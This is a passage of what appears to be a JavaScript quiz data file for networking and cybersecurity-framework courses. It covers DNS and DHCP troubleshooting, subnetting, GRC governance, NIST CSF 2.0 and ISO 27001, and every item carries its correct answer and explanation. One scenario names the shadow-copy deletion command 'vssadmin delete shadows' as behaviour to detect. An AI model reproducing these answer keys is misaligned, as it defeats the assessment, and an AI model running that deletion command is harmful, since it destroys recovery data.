      { id: "nf-q9-3", difficulty: "medium", tags: ["DNS"], scenario: "ping to a hostname fails with \"unknown host\" but ping to its IP works.", question: "Root cause?", options: ["Cable fault", "DNS resolution problem", "Firewall blocking ICMP", "Routing loop"], correctAnswer: 1, explanation: "IP works, name doesn't → DNS." },
      { id: "nf-q9-4", difficulty: "easy", tags: ["Tools"], scenario: "You need to see all listening ports and active TCP sessions on a host.", question: "Which tool is standard?", options: ["ping", "traceroute", "netstat / ss", "tracert"], correctAnswer: 2, explanation: "netstat / ss list listening sockets and established connections." },
      { id: "nf-q9-5", difficulty: "medium", tags: ["Capture"], scenario: "You must confirm whether a client is even sending SYNs toward a server.", question: "Which tool proves it at the packet level?", options: ["ping", "Wireshark / tcpdump packet capture", "nslookup", "route print"], correctAnswer: 1, explanation: "Only a packet capture proves what actually left/entered the wire." },
      { id: "nf-q9-6", difficulty: "hard", tags: ["Symptom → Layer"], scenario: "Web browsing works, but a specific SaaS app times out. Traceroute reaches the SaaS edge fine.", question: "Where would you focus next?", options: ["Physical cable", "Client-side firewall/proxy rules or app-layer auth blocking that app", "OSPF routing", "STP re-election"], correctAnswer: 1, explanation: "Reachability is fine; issue is likely application/proxy/policy specific to that SaaS." },
      { id: "nf-q9-7", difficulty: "medium", tags: ["Baseline"], scenario: "An analyst says \"the network is slow\" but has no numbers to compare against.", question: "What foundational practice is missing?", options: ["Backups", "Performance baseline (normal throughput/latency/loss)", "Password policy", "Anti-malware"], correctAnswer: 1, explanation: "Without a baseline you can't distinguish \"slow\" from \"normal\"." },
      { id: "nf-q9-8", difficulty: "medium", tags: ["DHCP"], scenario: "Multiple clients grab APIPA 169.254.x.x addresses at the same time.", question: "Most likely cause?", options: ["DNS server down", "DHCP server unreachable or scope exhausted", "STP disabled", "MAC filter enabled"], correctAnswer: 1, explanation: "APIPA is the fallback when DHCP fails — check server availability, scope, and relay." },
      { id: "nf-q9-9", difficulty: "easy", tags: ["Loopback"], scenario: "You want to confirm the local TCP/IP stack is healthy without touching the NIC.", question: "Which target do you ping?", options: ["8.8.8.8", "The default gateway", "127.0.0.1", "255.255.255.255"], correctAnswer: 2, explanation: "127.0.0.1 tests the local IP stack without leaving the host." },
      { id: "nf-q9-10", difficulty: "hard", tags: ["Root Cause"], scenario: "Half the users on VLAN 20 lose connectivity every morning at 9am when everyone plugs in.", question: "Most likely root cause?", options: ["DNS TTL", "DHCP scope exhaustion on VLAN 20", "IPv6 misconfig", "STP loop"], correctAnswer: 1, explanation: "Time-of-day correlation with logins strongly suggests the DHCP pool is too small for that VLAN." }
    ]
  },
  {
    quizId: "nf-q10",
    courseId: "network-fundamentals",
    title: "Network Fundamentals Certification Exam",
    description: "Comprehensive final exam covering all 9 modules. Pass with 80% to earn your certificate.",
    passingScore: 80,
    timeLimit: 45,
    questions: [
      { id: "nf-q10-1", difficulty: "easy", tags: ["OSI"], scenario: "A packet has IP addresses and TTL but no TCP header yet.", question: "Which OSI layer PDU is this?", options: ["Frame — L2", "Packet — L3", "Segment — L4", "Bit — L1"], correctAnswer: 1, explanation: "L3 packets carry IP addressing without transport headers." },
      { id: "nf-q10-2", difficulty: "easy", tags: ["TCP"], scenario: "Capture shows SYN, SYN-ACK, ACK between two hosts.", question: "What is happening?", options: ["Connection teardown", "TCP 3-way handshake", "UDP exchange", "ARP resolution"], correctAnswer: 1, explanation: "Classic TCP handshake." },
      { id: "nf-q10-3", difficulty: "easy", tags: ["Ports"], scenario: "A service listens on TCP/443.", question: "Which protocol?", options: ["HTTP", "SSH", "HTTPS", "SMTP"], correctAnswer: 2, explanation: "TCP/443 = HTTPS." },
      { id: "nf-q10-4", difficulty: "easy", tags: ["Ports"], scenario: "A service listens on UDP/53.", question: "Which protocol?", options: ["HTTP", "DNS", "SMTP", "SSH"], correctAnswer: 1, explanation: "UDP/53 = DNS." },
      { id: "nf-q10-5", difficulty: "medium", tags: ["Subnetting"], scenario: "You have 192.168.1.0/26.", question: "What is the broadcast address?", options: ["192.168.1.31", "192.168.1.63", "192.168.1.127", "192.168.1.255"], correctAnswer: 1, explanation: "/26 = 64 addresses; broadcast for the first subnet is .63." },
      { id: "nf-q10-6", difficulty: "medium", tags: ["Subnetting"], scenario: "You need ~50 hosts on one subnet with minimal waste.", question: "Which prefix fits best?", options: ["/24", "/25", "/26", "/27"], correctAnswer: 2, explanation: "/26 = 62 usable hosts — smallest fit for 50." },
      { id: "nf-q10-7", difficulty: "easy", tags: ["RFC1918"], scenario: "Which of these is a private RFC1918 range?", question: "Pick one.", options: ["8.8.8.0/24", "172.16.0.0/12", "169.254.0.0/16", "224.0.0.0/4"], correctAnswer: 1, explanation: "172.16.0.0/12 is RFC1918." },
      { id: "nf-q10-8", difficulty: "medium", tags: ["NAT"], scenario: "Many internal hosts share a single public IP outbound.", question: "Which mechanism?", options: ["ARP", "PAT / NAT overload", "STP", "OSPF"], correctAnswer: 1, explanation: "PAT (NAT overload) uses unique source ports per session." },
      { id: "nf-q10-9", difficulty: "medium", tags: ["Devices"], scenario: "Traffic must be routed between VLAN 10 and VLAN 20.", question: "Which device is required?", options: ["Hub", "L2 switch only", "Router or L3 switch", "Repeater"], correctAnswer: 2, explanation: "Inter-VLAN routing needs L3." },
      { id: "nf-q10-10", difficulty: "medium", tags: ["Switch Security"], scenario: "An attacker fills a switch's CAM table so it floods frames everywhere.", question: "What attack?", options: ["ARP spoofing", "MAC flooding", "DHCP starvation", "VLAN hop"], correctAnswer: 1, explanation: "CAM overflow = MAC flooding." },
      { id: "nf-q10-11", difficulty: "medium", tags: ["ARP"], scenario: "Two hosts see the gateway's IP mapped to an attacker's MAC.", question: "What attack?", options: ["ARP spoofing / poisoning", "STP TCN", "MAC flooding", "DHCP snooping"], correctAnswer: 0, explanation: "Forged ARP replies = poisoning enabling MITM." },
      { id: "nf-q10-12", difficulty: "easy", tags: ["Wi-Fi"], scenario: "A rogue AP mimics the corporate SSID to lure clients.", question: "What attack?", options: ["MAC flood", "Evil twin", "SYN flood", "DNS amplification"], correctAnswer: 1, explanation: "Evil twin = rogue AP with the same SSID." },
      { id: "nf-q10-13", difficulty: "medium", tags: ["Wi-Fi"], scenario: "Enterprise Wi-Fi authenticates each user against RADIUS via EAP.", question: "Which mode?", options: ["WPA2-Personal", "WPA2-Enterprise", "Open", "WEP"], correctAnswer: 1, explanation: "Per-user + RADIUS = Enterprise." },
      { id: "nf-q10-14", difficulty: "medium", tags: ["DNS"], scenario: "A host queries hundreds of long, high-entropy subdomains of one parent domain per minute.", question: "Most likely?", options: ["Normal browsing", "DNS tunneling / C2", "NTP sync", "Windows Update"], correctAnswer: 1, explanation: "Classic DNS tunneling fingerprint." },
      { id: "nf-q10-15", difficulty: "medium", tags: ["Email"], scenario: "A message failed alignment against the sender's \"p=reject\" policy.", question: "Which standard?", options: ["SPF", "DKIM", "DMARC", "STARTTLS"], correctAnswer: 2, explanation: "DMARC combines SPF/DKIM alignment and policy." },
      { id: "nf-q10-16", difficulty: "easy", tags: ["Remote Access"], scenario: "You must replace Telnet.", question: "With what?", options: ["FTP", "SSH", "HTTP", "TFTP"], correctAnswer: 1, explanation: "SSH on TCP/22 is the standard encrypted replacement." },
      { id: "nf-q10-17", difficulty: "easy", tags: ["File Transfer"], scenario: "You need encrypted file transfer between two Linux hosts.", question: "Choose one.", options: ["FTP", "TFTP", "SFTP/SCP", "HTTP"], correctAnswer: 2, explanation: "SFTP/SCP run over SSH." },
      { id: "nf-q10-18", difficulty: "medium", tags: ["ICMP"], scenario: "Ping to a host times out but TCP/443 responds.", question: "Best explanation?", options: ["Host is down", "ICMP is filtered; TCP/443 is allowed", "DNS is broken", "MTU mismatch"], correctAnswer: 1, explanation: "Common: block ICMP, allow business ports." },
      { id: "nf-q10-19", difficulty: "medium", tags: ["Tools"], scenario: "You need per-hop path visibility with latency.", question: "Which tool?", options: ["ping", "traceroute/tracert", "netstat", "nslookup"], correctAnswer: 1, explanation: "Traceroute shows path and per-hop RTT." },
      { id: "nf-q10-20", difficulty: "medium", tags: ["Tools"], scenario: "You must list active TCP sessions and listeners on a host.", question: "Which tool?", options: ["ping", "traceroute", "netstat / ss", "arp"], correctAnswer: 2, explanation: "netstat/ss enumerate sockets." },
      { id: "nf-q10-21", difficulty: "medium", tags: ["APIPA"], scenario: "A host self-assigns 169.254.5.9.", question: "Cause?", options: ["Successful DHCP", "DHCP failure — APIPA fallback", "Static config", "IPv6 SLAAC"], correctAnswer: 1, explanation: "169.254.0.0/16 = APIPA when DHCP fails." },
      { id: "nf-q10-22", difficulty: "easy", tags: ["Loopback"], scenario: "Test the local TCP/IP stack without leaving the host.", question: "Which target?", options: ["8.8.8.8", "127.0.0.1", "Default gateway", "255.255.255.255"], correctAnswer: 1, explanation: "127.0.0.1 is loopback." },
      { id: "nf-q10-23", difficulty: "medium", tags: ["Cabling"], scenario: "You plan a copper Ethernet run.", question: "Standard maximum length?", options: ["50 m", "100 m", "200 m", "500 m"], correctAnswer: 1, explanation: "Cat5e/6/6a cap at 100 m." },
      { id: "nf-q10-24", difficulty: "medium", tags: ["Fiber"], scenario: "You need a fiber run of ~40 km between data centers.", question: "Which fiber type?", options: ["Multimode 62.5μm", "Single-mode 9μm", "Cat6", "Cat6a"], correctAnswer: 1, explanation: "Single-mode fiber suits long-distance runs." },
      { id: "nf-q10-25", difficulty: "medium", tags: ["VLAN"], scenario: "A trunk carries VLANs 10/20/30 between switches.", question: "Which standard tags frames?", options: ["802.11", "802.1Q", "802.1X", "802.3ad"], correctAnswer: 1, explanation: "802.1Q inserts VLAN tags on trunks." },
      { id: "nf-q10-26", difficulty: "medium", tags: ["NAC"], scenario: "Ports demand user auth before allowing traffic.", question: "Which standard?", options: ["802.11", "802.1Q", "802.1X", "802.3"], correctAnswer: 2, explanation: "802.1X = port-based NAC." },
      { id: "nf-q10-27", difficulty: "medium", tags: ["Firewall"], scenario: "An NGFW blocks a file inside HTTPS after decrypting the session.", question: "Which capability?", options: ["Stateless ACL", "Stateful only", "DPI with TLS inspection", "MAC filter"], correctAnswer: 2, explanation: "DPI + TLS decryption is NGFW territory." },
      { id: "nf-q10-28", difficulty: "medium", tags: ["Zero Trust"], scenario: "A design treats no user or device as trusted by default and verifies every request.", question: "What model?", options: ["Perimeter model", "Zero Trust", "Air gap", "DMZ-only"], correctAnswer: 1, explanation: "Zero Trust = never trust, always verify." },
      { id: "nf-q10-29", difficulty: "hard", tags: ["NAT Attribution"], scenario: "You must attribute an external attack sourced from one public IP to a specific internal host.", question: "What do you need?", options: ["Only DNS logs", "NAT translation log tying {public IP + port + time} → internal IP", "Only firewall deny logs", "MAC address only"], correctAnswer: 1, explanation: "PAT attribution requires the translation-table log at the time of the event." },
      { id: "nf-q10-30", difficulty: "hard", tags: ["Troubleshooting"], scenario: "A user can ping the gateway and 8.8.8.8 by IP, but browsing fails.", question: "Most likely?", options: ["Cable", "DNS resolution", "STP loop", "MAC filter"], correctAnswer: 1, explanation: "IP works, name doesn't → DNS." }
    ]
  },
  // =============================================
  // CYBERSECURITY FRAMEWORKS COURSE QUIZZES
  // =============================================
  {
    quizId: "cf-q1",
    courseId: "cybersecurity-frameworks",
    title: "Governance & GRC: Decisions Under Pressure",
    description: "Scenario-driven assessment on governance structures, policy hierarchy, risk ownership, and how GRC decisions get made in a real organization.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q1-1",
        difficulty: "medium",
        tags: ["Governance", "Org Structure"],
        scenario: "Org chart (current):\n  CEO\n   └── CIO ──── CISO (dotted line to Audit Committee)\n         └── Infrastructure, App Dev, Service Desk\n\nQ3 finding: The CISO delayed a critical patch window twice because the CIO prioritised an ERP go-live. An internal auditor flags the reporting line as a governance weakness.",
        question: "What is the auditor's core objection to this structure?",
        options: [
          "The CISO lacks the technical certifications required to sit at the same level as the CIO",
          "Security assurance is reporting to the function it is meant to assure, creating a conflict of interest",
          "Dotted-line reporting to an Audit Committee is prohibited by ISO 27001 Clause 5",
          "The CISO should report to the Service Desk manager for faster incident escalation"
        ],
        correctAnswer: 1,
        explanation: "Governance requires independence of assurance. When the CISO reports into the CIO, IT delivery pressure can override security decisions — exactly what happened with the patch window. Remediation is a solid line to the CEO/Board or Audit Committee. ISO 27001 does not prohibit dotted lines; the issue is independence, not certification."
      },
      {
        id: "cf-q1-2",
        difficulty: "easy",
        tags: ["Policy Hierarchy"],
        scenario: "Four documents are submitted for the annual review cycle:\n  A) \"All remote access MUST use company-approved multi-factor authentication.\"\n  B) \"MFA tokens must be TOTP RFC 6238, 6-digit, 30-second period.\"\n  C) \"Step 1: open the IAM console. Step 2: select Enrol Device...\"\n  D) \"Where possible, prefer hardware keys over phone-based TOTP.\"",
        question: "Which document is the Standard?",
        options: [
          "Document A — it uses the mandatory word MUST",
          "Document B — it specifies the exact technical parameters that make the policy enforceable",
          "Document C — it is written for the person performing the task",
          "Document D — it defines the desired end state"
        ],
        correctAnswer: 1,
        explanation: "Policy (A) = the mandatory 'what'. Standard (B) = the specific, measurable technical requirement. Procedure (C) = the step-by-step 'how'. Guideline (D) = optional recommendation ('where possible', 'prefer'). Auditors test standards because they are the layer that is objectively measurable."
      },
      {
        id: "cf-q1-3",
        difficulty: "medium",
        tags: ["Risk Appetite", "Board Reporting"],
        scenario: "Board-approved statement:\n  Risk appetite: \"We accept up to $2M annualised loss exposure from cyber risk.\"\n  Risk tolerance: \"No single risk may exceed $400K; total may vary +/- 10% quarter to quarter.\"\n\nCurrent register: total exposure $2.1M, with one legacy-EDI risk rated at $650K.",
        question: "Which statement correctly describes the breach?",
        options: [
          "Nothing is breached — $2.1M is within the +/-10% tolerance band",
          "Only the total is breached; the individual risk is irrelevant to the board",
          "The per-risk tolerance is breached ($650K > $400K) even though the $2.1M total is inside the 10% band",
          "Both appetite and tolerance are breached because any figure above $2M is a violation"
        ],
        correctAnswer: 2,
        explanation: "$2.1M is 5% over $2M, inside the +/-10% tolerance band, so the aggregate is acceptable. But the legacy-EDI risk at $650K exceeds the $400K per-risk ceiling — a tolerance breach that must be escalated and treated regardless of the healthy aggregate. Appetite is the target; tolerance defines the acceptable deviation around it."
      },
      {
        id: "cf-q1-4",
        difficulty: "hard",
        tags: ["Risk Ownership", "Accountability"],
        scenario: "Risk register entry RSK-114:\n  Risk: Customer PII in the legacy CRM is unencrypted at rest.\n  Business unit: Sales Operations (VP: R. Mehta)\n  Control: database TDE, to be implemented by the Platform Engineering team (lead: J. Okafor)\n  Status: Platform Engineering has deprioritised TDE for two quarters.",
        question: "Who is accountable for the residual risk remaining open, and what is the correct escalation?",
        options: [
          "J. Okafor — the control owner is accountable, and Sales Operations should file a ticket",
          "R. Mehta — the risk owner is accountable and must either fund/escalate the control or formally accept the residual risk",
          "The CISO — all unresolved security risks default to the CISO's personal accountability",
          "Nobody — the risk auto-transfers to Platform Engineering once a control is assigned"
        ],
        correctAnswer: 1,
        explanation: "Accountability for a risk cannot be delegated with the control. R. Mehta (risk owner, the business leader who bears the consequence) must drive funding/escalation or sign a documented risk acceptance with an expiry date. J. Okafor is responsible for implementing and operating the control, not for the business decision to leave the risk open."
      },
      {
        id: "cf-q1-5",
        difficulty: "medium",
        tags: ["Compliance vs Security"],
        scenario: "Audit result: 100% of PCI-DSS requirements passed in March.\nJune: attacker enters via a third-party marketing SaaS with a shared admin credential, pivots to a segment that was declared out of scope, and exfiltrates 40K records.",
        question: "What does this outcome most directly illustrate?",
        options: [
          "The audit was fraudulent — a compliant environment cannot be breached",
          "Compliance is a point-in-time floor scoped to defined boundaries, not a continuous guarantee of security",
          "PCI-DSS is an obsolete standard and should be replaced with ISO 27001",
          "Third-party SaaS is never in scope for any security framework"
        ],
        correctAnswer: 1,
        explanation: "Compliance validates a defined scope at a moment in time. The two failure modes here are classic: drift after the assessment date, and risk living just outside the declared scope boundary. Mature programmes address this with continuous control monitoring and third-party risk management rather than annual snapshots."
      },
      {
        id: "cf-q1-6",
        difficulty: "easy",
        tags: ["GDPR", "Roles"],
        scenario: "A 900-employee ad-tech firm builds profiles from behavioural tracking across millions of EU users. Leadership asks whether they need any specific governance role beyond the existing CISO.",
        question: "Which role is legally required here, and why?",
        options: [
          "A Data Protection Officer, because the core activity is large-scale systematic monitoring of data subjects",
          "A Chief Technology Officer, because GDPR requires technical leadership for privacy",
          "No additional role — the CISO can satisfy every GDPR obligation by default",
          "A Data Protection Officer, but only after the first regulatory complaint is filed"
        ],
        correctAnswer: 0,
        explanation: "GDPR Art. 37 mandates a DPO when core activities involve regular and systematic monitoring of data subjects at large scale (or large-scale special-category processing). The DPO must be independent and report to the highest management level — which is also why folding the role into the CISO can create a conflict."
      },
      {
        id: "cf-q1-7",
        difficulty: "hard",
        tags: ["Steering Committee", "Program"],
        scenario: "Security investments keep stalling: Legal blocks a DLP rollout over employee-monitoring concerns, HR is unaware of the insider-threat programme, and Finance rejected the SIEM renewal after seeing only a technical justification.",
        question: "Which governance mechanism most directly addresses this pattern?",
        options: [
          "Hiring more Tier 1 analysts to reduce the alert backlog",
          "Standing up a cross-functional Security Steering Committee with Legal, HR, Finance and business owners to set and fund priorities",
          "Purchasing an integrated GRC platform to automate evidence collection",
          "Rewriting the acceptable use policy with stronger mandatory language"
        ],
        correctAnswer: 1,
        explanation: "The failures are all cross-functional alignment failures, not tooling or staffing failures. A Steering Committee gives Legal, HR and Finance a seat before decisions are made, converts technical asks into business-risk language, and creates a funding path. A GRC platform helps evidence, but it will not unblock Legal's objection."
      },
      {
        id: "cf-q1-8",
        difficulty: "medium",
        tags: ["Policy Lifecycle"],
        scenario: "The remote-access policy header reads:\n  Version 1.0 | Approved: 2019-04-11 | Next review: 2020-04-11\nSince approval the company adopted a zero-trust VPN replacement, moved 70% of workloads to cloud, and acquired two subsidiaries.",
        question: "What is the primary governance failure, and what is the correct trigger model for review?",
        options: [
          "Only the version number is stale; the content is likely still valid",
          "The policy is unreviewed for years — reviews must be at minimum annual AND event-driven on significant business or threat changes",
          "Policies should be reviewed monthly to track every configuration change",
          "The policy only needed review after a confirmed breach"
        ],
        correctAnswer: 1,
        explanation: "A six-year-old policy that predates zero-trust, cloud migration and two acquisitions no longer describes the environment it governs — it is unenforceable and misleads auditors. Best practice is annual review as a floor, plus event-driven review triggered by significant change (M&A, architecture shift, regulation, major incident)."
      }
    ]
  },
  {
    quizId: "cf-q2",
    courseId: "cybersecurity-frameworks",
    title: "NIST CSF 2.0: Profiles, Tiers & Gap Assessment",
    description: "Apply the six CSF functions, current/target profiles, and implementation tiers to real assessment decisions.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q2-1",
        difficulty: "easy",
        tags: ["CSF 2.0", "Functions"],
        scenario: "A 2024 assessment report is built around five function columns: Identify, Protect, Detect, Respond, Recover. The CISO notes that risk-strategy, roles and supply-chain oversight findings had nowhere clean to land.",
        question: "What changed in CSF 2.0 that resolves this?",
        options: [
          "Identify was expanded to absorb all governance outcomes",
          "A sixth function, GOVERN, was added and sits across the other five as the risk-strategy and oversight layer",
          "Recover was split into Recover and Restore",
          "Supply chain was moved into Respond"
        ],
        correctAnswer: 1,
        explanation: "CSF 2.0 introduced GOVERN (GV) — organisational context, risk-management strategy, roles/responsibilities, policy, oversight, and cybersecurity supply-chain risk management. It is not a sixth silo but the wrapper that informs the other five functions."
      },
      {
        id: "cf-q2-2",
        difficulty: "medium",
        tags: ["Profiles"],
        scenario: "Assessment output:\n  Current Profile — DE.CM: partial, ad-hoc log review; RS.MA: no formal IR plan\n  Target Profile — DE.CM: 24x7 monitoring; RS.MA: tested IR plan, quarterly exercises",
        question: "What is the delta between these two profiles used for?",
        options: [
          "It becomes the prioritised, cost-estimated action plan (the roadmap) closing gaps between where you are and where you need to be",
          "It is submitted to NIST for certification",
          "It sets the organisation's Implementation Tier automatically",
          "It replaces the risk register"
        ],
        correctAnswer: 0,
        explanation: "The Current Profile is 'as-is', the Target Profile is 'to-be' driven by business requirements, risk appetite and legal obligations. The gap between them, prioritised and costed, is the action plan. NIST does not certify CSF adoption, and tiers are chosen separately."
      },
      {
        id: "cf-q2-3",
        difficulty: "hard",
        tags: ["Tiers"],
        scenario: "Findings: risk decisions are made per-project with no organisation-wide method; the firm shares indicators with an ISAC and receives them, but does not adapt controls based on that intel; leadership is aware of cyber risk but has no formal risk-informed budgeting process.",
        question: "Which Implementation Tier best fits?",
        options: [
          "Tier 1 (Partial) — because there is no organisation-wide risk method",
          "Tier 2 (Risk Informed) — risk awareness exists and external participation has begun, but practices are not organisation-wide or adaptive",
          "Tier 3 (Repeatable) — because formal ISAC participation is present",
          "Tier 4 (Adaptive) — because threat intelligence is being consumed"
        ],
        correctAnswer: 1,
        explanation: "Tier 2 = risk-informed but not formalised organisation-wide; some external collaboration, informal or irregular. Tier 3 requires organisation-wide policy, formally approved and consistently applied. Tier 4 requires adapting controls continuously from lessons learned and predictive indicators — explicitly absent here. Tiers describe rigour, not a maturity score to maximise."
      },
      {
        id: "cf-q2-4",
        difficulty: "medium",
        tags: ["Function Mapping"],
        scenario: "Four post-incident actions after a ransomware event:\n  1) Restore file services from immutable backups within RTO\n  2) Publish a customer notification and coordinate with counsel\n  3) Add a Sigma rule for the observed vssadmin delete shadows behaviour\n  4) Update the asset inventory with the previously unknown servers found during response",
        question: "Map actions 1-4 to CSF functions in order.",
        options: [
          "Recover, Respond, Detect, Identify",
          "Respond, Recover, Protect, Identify",
          "Recover, Recover, Detect, Protect",
          "Protect, Respond, Detect, Govern"
        ],
        correctAnswer: 0,
        explanation: "Restoration of services = RECOVER (RC.RP). Notification/communications during the incident = RESPOND (RS.CO). New detection content = DETECT (DE.AE/DE.CM). Asset inventory correction = IDENTIFY (ID.AM). Analysts commonly mis-file communications as Recover — CSF places incident communications under Respond."
      },
      {
        id: "cf-q2-5",
        difficulty: "hard",
        tags: ["Gap Assessment", "Prioritisation"],
        scenario: "Gap list with business context:\n  G1: No MFA on internet-facing VPN (exploited by 3 peers this year) — cost $40K\n  G2: No formal cyber insurance review — cost $5K\n  G3: Backup restore never tested; ransomware is top board risk — cost $25K\n  G4: SIEM dashboard aesthetics inconsistent — cost $15K\nBudget available: $70K.",
        question: "Which funding decision best reflects risk-based CSF prioritisation?",
        options: [
          "Fund G2 and G4 first because they are the cheapest to close quickly",
          "Fund G1 and G3 — highest likelihood x impact against the stated top risk — and defer G2, drop G4",
          "Split the budget evenly across all four gaps",
          "Fund G4 first because leadership sees the dashboards"
        ],
        correctAnswer: 1,
        explanation: "CSF prioritisation is driven by risk, not by cost or visibility. G1 addresses an actively exploited access path; G3 validates the recovery capability for the board's top-rated risk — together $65K, inside budget. G2 is low-cost but low-urgency; G4 is cosmetic and delivers no risk reduction."
      },
      {
        id: "cf-q2-6",
        difficulty: "easy",
        tags: ["Framework Nature"],
        scenario: "A vendor markets itself as \"NIST CSF Certified\" and offers to certify your organisation in 30 days for a fee.",
        question: "What is the correct assessment of this claim?",
        options: [
          "Legitimate — NIST maintains an accredited CSF certification body",
          "Misleading — CSF is a voluntary, outcome-based framework with no official certification; only third-party attestations or self-assessment exist",
          "Legitimate only for US federal contractors",
          "Legitimate, because CSF Tier 4 is equivalent to certification"
        ],
        correctAnswer: 1,
        explanation: "NIST CSF is voluntary and non-certifiable — there is no NIST-accredited certification scheme. Organisations self-assess or engage assessors for an attestation of alignment. Certifiable schemes include ISO/IEC 27001 and, for the defence base, CMMC."
      },
      {
        id: "cf-q2-7",
        difficulty: "medium",
        tags: ["GOVERN", "Supply Chain"],
        scenario: "A payroll vendor is breached; your employee data is exposed. Post-mortem shows the contract had no security schedule, no breach-notification SLA, and the vendor was never risk-tiered.",
        question: "Which CSF 2.0 category most directly covers this failure?",
        options: [
          "PR.AC — Identity Management and Access Control",
          "GV.SC — Cybersecurity Supply Chain Risk Management",
          "DE.CM — Continuous Monitoring",
          "RC.CO — Recovery Communications"
        ],
        correctAnswer: 1,
        explanation: "GV.SC is the CSF 2.0 category for supplier risk: establishing supply-chain risk strategy, tiering suppliers, embedding requirements into contracts, and monitoring them over the relationship lifecycle. The absence of contractual security terms and vendor tiering is squarely a GV.SC gap."
      },
      {
        id: "cf-q2-8",
        difficulty: "medium",
        tags: ["Informative References"],
        scenario: "During the gap assessment the team asks: \"CSF tells us the outcome — DE.CM-01 'networks are monitored to find potentially adverse events' — but not what to actually implement.\"",
        question: "What element of the CSF resolves this, and what does it point to?",
        options: [
          "Implementation Tiers, which specify required tooling",
          "Informative References, which map each subcategory to detailed controls in ISO 27001, CIS Controls, NIST SP 800-53 and similar",
          "The Target Profile, which lists approved vendors",
          "The GOVERN function, which defines technical baselines"
        ],
        correctAnswer: 1,
        explanation: "CSF is deliberately outcome-based and technology-neutral. Informative References bridge the outcome to prescriptive control catalogues — e.g. DE.CM subcategories map to NIST SP 800-53 SI-4, CIS Control 13, and ISO 27001 Annex A monitoring controls. This is how CSF coexists with, rather than replaces, other frameworks."
      }
    ]
  },
  {
    quizId: "cf-q3",
    courseId: "cybersecurity-frameworks",
    title: "ISO/IEC 27001: ISMS, Annex A & Audit Readiness",
    description: "Certification-focused scenarios on ISMS scope, Statement of Applicability, ISO 27005 risk methodology, and audit findings.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q3-1",
        difficulty: "medium",
        tags: ["ISMS Scope"],
        scenario: "Scope statement submitted to the certification body:\n  \"The ISMS covers all information systems supporting the SaaS platform hosted in eu-west-1, including development, operations and support functions in the Dublin office.\"\nThe company also runs an on-prem HR system in Manila that holds employee data and connects to the SaaS SSO tenant.",
        question: "What is the risk with this scope, from an auditor's perspective?",
        options: [
          "No risk — narrow scope is always acceptable if documented",
          "The Manila HR system interfaces with an in-scope component (SSO), so interfaces and dependencies must be identified and controlled or the scope is not defensible",
          "ISO 27001 requires all global operations to be in scope without exception",
          "Scope statements cannot reference cloud regions"
        ],
        correctAnswer: 1,
        explanation: "ISO 27001 Clause 4.3 permits a narrow scope, but requires interfaces and dependencies with out-of-scope parties to be explicitly identified and addressed. An SSO trust path from an out-of-scope system into the ISMS is exactly the kind of dependency an auditor will probe — undeclared, it becomes a nonconformity."
      },
      {
        id: "cf-q3-2",
        difficulty: "hard",
        tags: ["Statement of Applicability"],
        scenario: "SoA extract:\n  A.8.12 Data leakage prevention — Applicable: NO — Justification: \"Not required.\"\n  A.5.7 Threat intelligence — Applicable: YES — Implemented: NO\n  A.8.16 Monitoring activities — Applicable: YES — Implemented: YES (SIEM, 24x7)",
        question: "Which entry will most likely raise a nonconformity, and why?",
        options: [
          "A.8.16, because 24x7 monitoring is not required by ISO 27001",
          "A.8.12, because an exclusion requires a documented risk-based justification — \"Not required\" is not one",
          "A.5.7, because applicable controls may never be marked unimplemented",
          "None — the SoA is complete as written"
        ],
        correctAnswer: 1,
        explanation: "Every Annex A control must be considered, and any exclusion must carry a justification traceable to the risk assessment. \"Not required\" is a bare assertion. A.5.7 marked applicable-but-not-implemented is acceptable provided it appears in the risk treatment plan with an owner and target date."
      },
      {
        id: "cf-q3-3",
        difficulty: "medium",
        tags: ["ISO 27005", "Risk"],
        scenario: "Risk analysis worksheet:\n  Asset: customer database\n  Threat: SQL injection via public API\n  Vulnerability: unparameterised query in legacy endpoint\n  Likelihood: 4/5   Impact: 5/5   Inherent risk: 20\n  Existing control: WAF in detection-only mode\n  Residual risk: 20",
        question: "What is methodologically wrong here?",
        options: [
          "Inherent risk should never be calculated before controls",
          "Residual risk is unchanged despite an existing control — either the control's (partial) effect must be reflected, or its detection-only mode must be documented as providing zero reduction",
          "Likelihood and impact must always be equal",
          "SQL injection is a vulnerability, not a threat"
        ],
        correctAnswer: 1,
        explanation: "ISO 27005 expects residual risk to be the risk remaining after existing controls are accounted for. Copying inherent to residual with an active control listed is either an error or an undocumented judgement that a detect-only WAF provides no mitigation — which is defensible but must be stated, since it drives the treatment decision."
      },
      {
        id: "cf-q3-4",
        difficulty: "easy",
        tags: ["Clauses"],
        scenario: "An auditor says: \"Your Annex A controls look strong, but I am issuing a major nonconformity against Clause 9.\"",
        question: "What is most likely missing?",
        options: [
          "Internal audit programme and/or management review of the ISMS",
          "Encryption of data at rest",
          "An asset inventory",
          "Supplier security agreements"
        ],
        correctAnswer: 0,
        explanation: "Clause 9 is Performance Evaluation: monitoring and measurement, internal audit, and management review. Certification hinges on the management-system clauses (4-10) as much as on Annex A controls — a common failure is strong technical controls with no evidence of internal audit or documented management review."
      },
      {
        id: "cf-q3-5",
        difficulty: "hard",
        tags: ["Risk Treatment"],
        scenario: "Risk: a third-party payment integration could leak card data. Options costed:\n  A) Re-architect to a hosted payment page — $180K, removes the data from your environment\n  B) Purchase cyber insurance covering card-breach costs — $30K/yr\n  C) Tokenise and add monitoring — $60K, reduces likelihood and impact\n  D) Document and accept, sponsored by the CFO",
        question: "Match each option to the ISO 27005 risk treatment type.",
        options: [
          "A=Avoid, B=Share/Transfer, C=Modify/Reduce, D=Retain/Accept",
          "A=Modify, B=Avoid, C=Retain, D=Share",
          "A=Share, B=Retain, C=Avoid, D=Modify",
          "All four are forms of risk modification"
        ],
        correctAnswer: 0,
        explanation: "Removing the data from scope eliminates the risk source = Avoid. Insurance shifts financial consequence to a third party (never accountability) = Share/Transfer. Tokenisation plus monitoring reduces likelihood/impact = Modify. A documented, sponsored decision to live with it = Retain/Accept, which must be formally approved by the risk owner."
      },
      {
        id: "cf-q3-6",
        difficulty: "medium",
        tags: ["Certification Lifecycle"],
        scenario: "Certification timeline: Stage 1 audit completed in March, Stage 2 in May, certificate issued in June 2024.",
        question: "What happens over the following three years?",
        options: [
          "Nothing until a full recertification audit in year three",
          "Annual surveillance audits in years one and two, then a full recertification audit in year three",
          "Quarterly surveillance audits every year",
          "The certificate is permanent once issued"
        ],
